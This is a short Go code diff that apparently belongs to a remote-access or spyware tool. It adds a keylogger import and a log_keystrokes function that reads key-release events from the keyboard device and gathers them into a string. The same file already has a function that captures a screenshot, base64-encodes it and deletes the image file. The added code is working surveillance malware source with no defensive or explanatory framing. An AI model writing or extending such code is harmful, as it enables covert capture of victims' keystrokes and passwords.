@@ -17,6 +17,7 @@ import (
 	"time"
 
 	"github.com/kbinani/screenshot"
+	"github.com/MarinX/keylogger"
 )
 
 const (
@@ -148,4 +149,27 @@ func take_screenshot() (string) {
 	b64_string := b64.StdEncoding.EncodeToString(content)
 	os.Remove("scrshot.png")
 	return b64_string
+}
+
+// log keystrokes
+func log_keystrokes() (string, string) {
+	keyboard := keylogger.FindKeyboardDevice()
+	if len(keyboard) <= 0 {
+		return "", "No keyboard found"
+	}
+	if k, err := keylogger.New(keyboard); err != nil {
+		return "", err.Error()
+	} else {
+		logs := ""
+		events := k.Read()
+		for e := range events {
+			switch e.Type {
+			case keylogger.EvKey:
+				if e.KeyRelease() {
+					logs += e.KeyString()
+				}
+			}
+		}
+		return logs, ""
+	}
 }
